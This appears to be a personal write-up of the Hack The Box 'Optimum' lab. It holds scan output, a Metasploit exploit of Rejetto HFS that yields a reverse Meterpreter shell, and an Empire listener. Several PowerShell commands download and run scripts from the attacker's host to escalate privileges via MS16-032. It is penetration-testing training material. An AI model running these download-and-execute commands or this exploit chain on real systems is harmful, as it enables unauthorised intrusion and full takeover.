---
### The title for the content.
title: "Optimum"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "optimum"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description: "Notes from the Optimum machine on HTB."
### The datetime assigned to this page.
date : 2020-03-10T16:43:47+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "optimum"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## optimum

### where you at

10.10.10.8

### what you got

{{%attachments title="Related files" style="grey" pattern=".*(nmap)" /%}}

```bash
# Nmap 7.80 scan initiated Fri Jan 24 15:18:36 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/full_tcp.gnmap 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.020s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (98%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (98%), Microsoft Windows Server 2012 R2 (98%), Microsoft Windows 7 Professional (91%), Microsoft Windows Embedded Standard 7 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 (89%), Microsoft Windows Server 2008 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   21.08 ms 10.10.14.1
2   21.03 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 24 15:20:18 2020 -- 1 IP address (1 host up) scanned in 101.59 seconds
```

{{%attachments title="Related files" style="grey" pattern=".*(nikto)" /%}}

```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.8
+ Target Port: 80
+ GET Cookie HFS_SID created without the httponly flag
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-38019: GET /?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). CA-2000-02.
```

{{%attachments title="Related files" style="grey" pattern=".*(gobuster)" /%}}

```bash
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                               | exploits/windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                                    | exploits/windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                       | exploits/multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                  | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                  | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                             | exploits/windows/webapps/34852.txt
```

```bash
msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.8       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    10.10.14.24      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    4444             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.24      yes       The listen address (an interface may be specified)
   LPORT     8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.24:8080
[*] Using URL: http://10.10.14.24:4444/MCCmUGaEI9axpem
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /MCCmUGaEI9axpem
[*] Sending stage (206403 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.24:8080 -> 10.10.10.8:49613) at 2020-01-24 20:16:19 +0100
[!] Tried to delete %TEMP%\rSrxEg.vbs, unknown result
[*] Server stopped.

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x64/windows


meterpreter > powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/Sherlock.ps1');$a=find-allvulns;$a | where-object {$_.VulnStatus -notlike 'not *'}| ft Title,VulnStatus,MSBulletin,CVEID,Link -autosize"

Title                           VulnStatus         MSBulletin CVEID
-----                           ----------         ---------- -----
Secondary Logon Handle          Appears Vulnerable MS16-032   2016-0099
Windows Kernel-Mode Drivers EoP Appears Vulnerable MS16-034   2016-0093/94/9...
Win32k Elevation of Privilege   Appears Vulnerable MS16-135   2016-7255



Background session 2? [y/N]  
```

{{%attachments title="Related files" style="grey" pattern=".*(sherlock)" /%}}

```bash
./windows-exploit-suggester.py -i /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/systeminfo.txt -d 2020-01-24-mssb.xls >> /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/wes.txt

```

```powershell
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        http                             Name for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  SlackChannel      False       #general                         The Slack channel or DM that notifications will be sent to.
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Host              True        http://10.10.14.24:80            Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  StagingKey        True        :G8UuB/cqX2t^=?a[b{!Hd*#IZy_hrnL Staging key for initial agent negotiation.
  BindIP            True        10.10.14.24                      The IP to bind to on the control server.
  Port              True        80                               Port for the listener.
  ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php


(Empire: listeners/http) > run
*** Unknown syntax: run
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) >
(Empire: listeners/http) > launcher powershell
powershell -noP -sta -w 1 -enc  SQBGA....FgA
```

{{%attachments title="Related files" style="grey" pattern=".*(e.ps1|i.ps1)" /%}}

cp /opt/Empire/data/module_source/privesc/Invoke-MS16032.ps1 i.ps1

```powershell
....
  }
}invoke-ms16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/e.ps1')"
```

```powershell
meterpreter > shell
Process 2536 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/i.ps1')"
powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/i.ps1')"
     __ __ ___ ___   ___     ___ ___ ___
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|

                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

```bash
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Optimum/web# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.8 - - [24/Jan/2020 20:49:09] "GET /i.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [24/Jan/2020 20:49:22] "GET /e.ps1 HTTP/1.1" 200 -
```

```powershell
(Empire: listeners) > [*] Sending POWERSHELL stager (stage 1) to 10.10.10.8
[*] New agent WYDHC35E checked in
[+] Initial agent WYDHC35E from 10.10.10.8 now active (Slack)
[*] Sending agent (stage 2) to WYDHC35E at 10.10.10.8
(Empire: listeners) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------
 WYDHC35E ps 10.10.10.8      OPTIMUM           *NT AUTHORITY\SYSTEM    powershell         1684   5/0.0    2020-01-24 20:50:03

```
